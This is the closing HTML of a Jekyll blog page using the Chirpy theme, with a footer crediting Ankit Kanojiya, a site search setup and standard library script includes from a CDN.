          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

